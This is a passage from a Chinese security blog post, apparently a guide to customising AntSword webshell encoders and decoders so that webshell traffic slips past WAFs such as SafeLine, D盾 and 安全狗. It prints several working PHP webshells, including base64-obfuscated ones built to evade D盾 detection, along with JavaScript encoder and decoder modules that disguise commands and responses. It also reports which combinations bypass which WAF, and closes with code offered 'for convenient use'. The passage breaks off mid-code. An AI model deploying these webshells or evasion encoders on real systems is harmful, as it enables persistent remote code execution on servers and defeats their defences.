class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(@gzinflate(base64_decode(<span class="variable">$_POST</span>[<span class="string">&#x27;ant&#x27;</span>])));</span><br><span class="line"></span><br><span class="line">放一个简单过d盾的，d盾默认是不能访问三级的脚本，这个是二级，仅用于测试用。</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">x</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$did</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;       <span class="keyword">$this</span>-&gt;id=<span class="string">&#x27;QGV2YWwoQGd6aW5mbGF0ZShiYXNlNjRfZGVjb2RlKCRfUE9TVFsnYW50J10pKSk7&#x27;</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;did = @base64_decode( <span class="keyword">$this</span>-&gt;id );</span><br><span class="line">                @<span class="keyword">eval</span>(<span class="string">&quot;/*sasa123*/&quot;</span>.<span class="keyword">$this</span>-&gt;did.<span class="string">&quot;/*sd123*/&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> x();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里我们传值的时候会把ant的值和ceshi的值给gzinflate压缩，这样就更安全一点。但是其实其中的payload{$p=base64_decode(substr($_POST[“detail”],2));$s=base64_decode(substr($_POST[“value”],2));$envstr=@base64_decode(substr($_POST[“action”],2)不会变，也就是还是base64，<br><img src="/images/antsword-bypasswaf/image-20240301142424590.png" alt="image-20240301142424590"></p><p>这个Y21k经常被匹配到，他是cmd的base64。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//解密压缩流量</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$encrypted</span> = <span class="string">&quot;c0gtS8zRcEivysxLy0ksSdVISixONTOJT0lNzk9J1VCJD%2FAPDolOTi3OyIzV1NS0BgA%3D&quot;</span>; <span class="comment">// 这里替换成你要解密的内容</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 先对加密过的字符串进行 base64 解码</span></span><br><span class="line"><span class="comment">//echo $encrypted;</span></span><br><span class="line"><span class="variable">$encrypted</span> = urldecode(<span class="variable">$encrypted</span>);</span><br><span class="line"><span class="variable">$decoded</span> = base64_decode(<span class="variable">$encrypted</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 然后对解码后的字符串进行 gzinflate 解压缩</span></span><br><span class="line"><span class="variable">$uncompressed</span> = @gzinflate(<span class="variable">$decoded</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 最后将解压缩后的字符串输出</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$uncompressed</span>;</span><br></pre></td></tr></table></figure><p><img src="/images/antsword-bypasswaf/image-20240301142614372.png" alt="image-20240301142614372"></p><p>当然无论怎么压缩，不会对对抗人工审查有大的效果，只会耗时间，因为知道了wenshell，也就知道了密码的解密方式，知道了密码的解密方式，就知道payload的解密方式，随即就知道了，功能传递的参数解密的方式。或许对抗人工有一丢丢用。<br>先埋个坑：将参数传递的键改掉。</p><h6 id="3-3解码器"><a href="#3-3解码器" class="headerlink" title="3.3解码器"></a>3.3解码器</h6><p>这里一定要注意编码器与解码器无关，除非一种情况，就是传递参数的时候，直接把返回的结果进行编码或加密，这样解密的时候就和解码相关了。<br>先来看一下，返回结果不编码，就是会直接把结果显示出来。<br><img src="/images/antsword-bypasswaf/image-20240301152614725.png" alt="image-20240301152614725"></p><p>新建一个解码器</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * php::base64解码器</span></span><br><span class="line"><span class="comment"> * Create at: 2024/03/01 15:28:19</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@returns <span class="type">&#123;string&#125;</span> </span>asenc 将返回数据base64编码</span></span><br><span class="line"><span class="comment">   * 自定义输出函数名称必须为 asenc</span></span><br><span class="line"><span class="comment">   * 该函数使用的语法需要和shell保持一致</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="attr">asoutput</span>: <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`function asenc($out)&#123;</span></span><br><span class="line"><span class="string">      return @base64_encode($out);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    `</span>.replace(<span class="regexp">/\n\s+/g</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 解码 Buffer</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param <span class="type">&#123;string&#125;</span> </span>data 要被解码的 Buffer</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@returns <span class="type">&#123;string&#125;</span> </span>解码后的 Buffer</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="attr">decode_buff</span>: <span class="function">(<span class="params">data, ext=&#123;&#125;</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> Buffer.from(data.toString(), <span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码的解释已经很详细了， asoutput:结果是返回数据的base64编码，那不没有这个解码器，$out就是返回结果function asenc($out){<br>      return @base64_encode($out);<br>    }</p><p>就是base64编码了结果，输出的值。<br>下面decode_buff是解码的结果，这个data就是上面base64编码的结果，Buffer.from(data.toString(), ‘base64’);是将返回的base64解码一下，传给蚁剑的客户端，然后显示到我们的面前。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">`cd /d &quot;$&#123;path&#125;&quot;&amp;$&#123;cmd&#125;&amp;echo $&#123;this.stag&#125;&amp;cd&amp;echo $&#123;this.etag&#125;` :</span><br></pre></td></tr></table></figure><p>原版的modules文件夹下的terminal.js会默认输出this.etag间隔符,<br><img src="/images/antsword-bypasswaf/image-20240301153914992.png" alt="image-20240301153914992"></p><p>就是前缀和后缀，把前面去掉即可<br><img src="/images/antsword-bypasswaf/image-20240301154016699.png" alt="image-20240301154016699"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * php::base64解码器</span></span><br><span class="line"><span class="comment"> * Create at: 2020/05/22 10:21:48</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@returns <span class="type">&#123;string&#125;</span> </span>asenc 将返回数据base64编码</span></span><br><span class="line"><span class="comment">   * 自定义输出函数名称必须为 asenc</span></span><br><span class="line"><span class="comment">   * 该函数使用的语法需要和shell保持一致</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="attr">asoutput</span>: <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`function asenc($out)&#123;</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">       $a = base64_encode($out);</span></span><br><span class="line"><span class="string">        return &#x27;&#123;&quot;message&quot;:&quot;&#x27; .strrev($a) . &#x27;&quot;&#125;&#x27;;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    `</span>.replace(<span class="regexp">/\n\s+/g</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 解码 Buffer</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param <span class="type">&#123;string&#125;</span> </span>data 要被解码的 Buffer</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@returns <span class="type">&#123;string&#125;</span> </span>解码后的 Buffer</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="attr">decode_buff</span>: <span class="function">(<span class="params">data, ext=&#123;&#125;</span>) =&gt;</span> &#123;</span><br><span class="line">     <span class="keyword">let</span> res = Buffer.from(data.toString().replace(<span class="regexp">/&#123;&quot;message&quot;:&quot;/g</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="regexp">/&quot;&#125;/g</span>,<span class="string">&#x27;&#x27;</span>).split(<span class="string">&#x27;&#x27;</span>).reverse().join(<span class="string">&#x27;&#x27;</span>), <span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line">   </span><br><span class="line">     <span class="keyword">return</span> res</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单对结果进行操作一下，这里先将out的值进行base64，然后逆序一下，返回的值拼接message,json的格式，终端拿到数据，要先匹配message，然后逆序，最后解码即可。<br>tips：这里一定要注意， asoutput: () =&gt; {里面的反引号为php的语言，并不是notejs，这里研究了好长时间。下面的res是notejs语法。</p><p><img src="/images/antsword-bypasswaf/image-20240301155446538.png" alt="image-20240301155446538"></p><p>这里回显包的就是这个样的。<br>看起来很突兀，前缀后缀都有。<br>我们给他去掉，在php文件夹下的index.js中有四个分割符<br><img src="/images/antsword-bypasswaf/image-20240301155934647.png" alt="image-20240301155934647"></p><p>我们都给他注释掉，替换为空。重启发包<br><img src="/images/antsword-bypasswaf/image-20240301160012843.png" alt="image-20240301160012843"></p><p>这样就有那味了。<br>因为base64的特性，这里还是可以一眼看出这是base64，两个等于号。<br>这里值得思考，这样其实就足以应对waf检测回显包了，但是人工检测还是不行，但是打战的时候，肯定是waf检测，所以及格就行，先埋个坑。<br>当然解密这个流量也非常简单<br><img src="/images/antsword-bypasswaf/image-20240301160510507.png" alt="image-20240301160510507"></p><h5 id="4-waf-测试"><a href="#4-waf-测试" class="headerlink" title="4.waf 测试"></a>4.waf 测试</h5><h6 id="4-1bt-雷池"><a href="#4-1bt-雷池" class="headerlink" title="4.1bt+雷池"></a>4.1bt+雷池</h6><p>笔者这里测试的都是，假设我们上传好了webshell，看一下waf会不会拦截流量。<br>木马为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">x</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$did</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;       <span class="keyword">$this</span>-&gt;id=<span class="string">&#x27;QGV2YWwoQGd6aW5mbGF0ZShiYXNlNjRfZGVjb2RlKCRfUE9TVFsnYW50J10pKSk7&#x27;</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;did = @base64_decode( <span class="keyword">$this</span>-&gt;id );</span><br><span class="line">                @<span class="keyword">eval</span>(<span class="string">&quot;/*sasa123*/&quot;</span>.<span class="keyword">$this</span>-&gt;did.<span class="string">&quot;/*sd123*/&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> x();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * php::zlib_deflated_raw 编码器</span></span><br><span class="line"><span class="comment"> * Create at: 2019/01/12 00:05:44</span></span><br><span class="line"><span class="comment"> * zlib 压缩 payload, 适配 shell 见代码处</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> zlib = <span class="keyword">require</span>(<span class="string">&#x27;zlib&#x27;</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span>  &#123;String&#125; pwd   连接密码</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span>  &#123;Array&#125;  data  编码器处理前的 payload 数组</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span> &#123;Array&#125;  data  编码器处理后的 payload 数组</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">module.exports = (pwd, data, ext=&#123;&#125;) =&gt; &#123;</span><br><span class="line">  ext.opts.httpConf.headers[<span class="string">&#x27;User-Agent&#x27;</span>]=<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)&#x27;</span>;</span><br><span class="line">  <span class="comment">// ##########    请在下方编写你自己的代码   ###################</span></span><br><span class="line">  let randomID = `ceshi`;</span><br><span class="line">  data[randomID] = zlib.deflateRawSync(data[<span class="string">&#x27;_&#x27;</span>]).toString(<span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line">  <span class="comment">// 英语单词列表</span></span><br><span class="line">  <span class="comment">// const wordList = [&#x27;apple&#x27;, &#x27;banana&#x27;, &#x27;car&#x27;, &#x27;dog&#x27;, &#x27;elephant&#x27;, &#x27;flower&#x27;];</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// // 生成一个随机索引</span></span><br><span class="line">  <span class="comment">// const randomIndex = randomInt(0, wordList.length - 1);</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// // 获取随机单词</span></span><br><span class="line">  <span class="comment">// const randomWord = wordList[randomIndex];</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// // 在调用模块之前，将随机单词添加到 data 对象中</span></span><br><span class="line">  <span class="comment">// data[&#x27;123&#x27;] = randomWord;</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 调用模块并传入 data 对象</span></span><br><span class="line"><span class="comment">// 处理返回的结果</span></span><br><span class="line"><span class="comment">// 这里的 processedData 即为处理后的 payload 数据</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// <span class="meta">&lt;?php</span> @eval($_POST[&#x27;ant&#x27;]);<span class="meta">?&gt;</span></span></span><br><span class="line">  <span class="comment">//data[pwd] = `eval(@gzinflate(base64_decode($_POST[$&#123;randomID&#125;])));`;</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// <span class="meta">&lt;?php</span> @eval(@gzinflate(base64_decode($_POST[&#x27;ant&#x27;]))); <span class="meta">?&gt;</span></span></span><br><span class="line">  data[pwd] = zlib.deflateRawSync(`@<span class="keyword">eval</span>(@gzinflate(base64_decode(<span class="variable">$_POST</span>[$&#123;randomID&#125;])));`).toString(<span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// <span class="meta">&lt;?php</span> @eval(@gzinflate(base64_decode($_POST[&#x27;ant&#x27;]))); <span class="meta">?&gt;</span></span></span><br><span class="line">  <span class="comment">// data[pwd] = zlib.deflateRawSync(`@eval(@gzinflate(base64_decode($_POST[$&#123;randomID&#125;])));`).toString(&#x27;base64&#x27;);</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// ##########    请在上方编写你自己的代码   ###################</span></span><br><span class="line"></span><br><span class="line">  delete data[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line">  <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>php7.3。<br><img src="/images/antsword-bypasswaf/image-20240301162929597.png" alt="image-20240301162929597"></p><p>正常不加密，就会被雷池拦截</p><p>选用编码器，不用解码器，不拦截</p><p><img src="/images/antsword-bypasswaf/image-20240301162818532.png" alt="image-20240301162818532"></p><p>etc/passwd都不拦截</p><p><img src="/images/antsword-bypasswaf/image-20240301162745572.png" alt="image-20240301162745572"></p><p><img src="/images/antsword-bypasswaf/image-20240301162553844.png" alt="image-20240301162553844"></p><p>匹配到了流量。<br>那么也就是，雷池不检测返回包。</p><p>试下下面这个组合，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@eval(base64_decode($_POST[&#x27;tunan&#x27;]));</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * php::base64编码器</span><br><span class="line"> * Create at: 2021/04/18 15:36:16</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">&#x27;use strict&#x27;;</span><br><span class="line"></span><br><span class="line">module.exports = (pwd, data, ext=&#123;&#125;) =&gt; &#123;</span><br><span class="line">  let randomID = `_0x$&#123;Math.random().toString(16).substr(2)&#125;`;</span><br><span class="line">  data[randomID] = Buffer.from(data[&#x27;_&#x27;]).toString(&#x27;base64&#x27;);</span><br><span class="line">  data[pwd] = Buffer.from(`eval(base64_decode($_POST[$&#123;randomID&#125;]));`).toString(&#x27;base64&#x27;);</span><br><span class="line">  delete data[&#x27;_&#x27;];</span><br><span class="line">  return data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/antsword-bypasswaf/image-20240301163950697.png" alt="image-20240301163950697"></p><p><img src="/images/antsword-bypasswaf/image-20240301164003754.png" alt="image-20240301164003754"></p><p>雷池应该是会自己解base64的。<br>下面这个组合雷池也检测不到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">foreach($_POST as $k =&gt; $v)&#123;$_POST[$k]=pack(&quot;H*&quot;, $v);&#125;</span><br><span class="line">@eval($_POST[&#x27;ant&#x27;]);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * php::hex编码器</span><br><span class="line"> * Create at: 2021/09/24 16:32:26</span><br><span class="line"> */</span><br><span class="line">    &#x27;use strict&#x27;;</span><br><span class="line"></span><br><span class="line">module.exports = (pwd, data) =&gt; &#123;</span><br><span class="line">  let ret = &#123;&#125;;</span><br><span class="line">  for (let _ in data) &#123;</span><br><span class="line">    if (_ === &#x27;_&#x27;) &#123; continue &#125;;</span><br><span class="line">    ret[_] = Buffer.from(data[_]).toString(&#x27;hex&#x27;);</span><br><span class="line">  &#125;</span><br><span class="line">  ret[pwd] = Buffer.from(data[&#x27;_&#x27;]).toString(&#x27;hex&#x27;);</span><br><span class="line">  return ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/antsword-bypasswaf/image-20240301164512873.png" alt="image-20240301164512873"></p><p><img src="/images/antsword-bypasswaf/image-20240301164550922.png" alt="image-20240301164550922"></p><p>手工就很简单了。</p><p>简单的来说，目前雷池会拦截没有任何编码的，和一层base64的，但是要是随便改一下，雷池就不拦截了。</p><h6 id="4-2iis-php-d盾"><a href="#4-2iis-php-d盾" class="headerlink" title="4.2iis+php+d盾"></a>4.2iis+php+d盾</h6><p>这里我们还是假设已经上传上去webshell了，为什么呢，d盾在默认安装好后，直接文件上传就是白名单，经过google没有找到能绕过去白名单的方法。<br>这里还有一个情况，就是我们的webshell要小于三级，如果大于或等于三级，<img src="/images/antsword-bypasswaf/image-20240301171602345.png" alt="image-20240301171602345"></p><p>d盾直接拦截。<br>简单做个免杀，绕过d盾，然后再去访问就可以了。</p><p><img src="/images/antsword-bypasswaf/image-20240304135141095.png" alt="image-20240304135141095"></p><p><img src="/images/antsword-bypasswaf/image-20240304135814329.png" alt="image-20240304135814329"></p><p>但是当我们执行命令的时候是不行，d盾直接拦截cmd。<br>但是<img src="/images/antsword-bypasswaf/image-20240304135853060.png" alt="image-20240304135853060">读取文件，和上传文件是没有问题的。<br>因为d盾直接拦截的cmd命令。而蚁剑读取文件时用的fread函数。也可以文件上传。<br><img src="/images/antsword-bypasswaf/image-20240304140101089.png" alt="image-20240304140101089"></p><p>所以就是说只要不rce，还是能操作文件的。</p><h6 id="4-3-安全狗"><a href="#4-3-安全狗" class="headerlink" title="4.3 安全狗"></a>4.3 安全狗</h6><p>安全狗的拦截规则是如果安全狗判定为木马，那么就过不去，如果不是，就不会拦截。<br>这里木马是过安全狗的，所以直接就可以执行。</p><h5 id="5-小结"><a href="#5-小结" class="headerlink" title="5. 小结"></a>5. 小结</h5><h5 id="6-代码"><a href="#6-代码" class="headerlink" title="6. 代码"></a>6. 代码</h5><p>贴下代码，方便使用。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line">d盾二级webshell</span><br><span class="line">原版</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">x</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        public $id = <span class="literal">null</span>;</span><br><span class="line">        public $did = <span class="literal">null</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;       $this-&gt;id=<span class="string">&#x27;JHN0ID0gJF9QT1NUWyd0ZXN0J107CiRzYSA9IHN1YnN0cl9yZXBsYWNlKCRzdCwgIiIsIDAsIDkpOwpldmFsKGJhc2U2NF9kZWNvZGUoJHNhKSk7&#x27;</span>;</span><br><span class="line">                $this-&gt;did = @base64_decode( $this-&gt;id );</span><br><span class="line">                @<span class="built_in">eval</span>(<span class="string">&quot;/*sasa123*/&quot;</span>.$this-&gt;did.<span class="string">&quot;/*sd123*/&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> x(); </span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">zlib压缩</span><br><span class="line">webshell  格式</span><br><span class="line">@<span class="built_in">eval</span>(@gzinflate(base64_decode($_POST[<span class="string">&#x27;a&#x27;</span>])));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">编码</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * php::zlib_deflated_raw 编码器</span></span><br><span class="line"><span class="comment"> * Create at: 2019/01/12 00:05:44</span></span><br><span class="line"><span class="comment"> * zlib 压缩 payload, 适配 shell 见代码处</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span 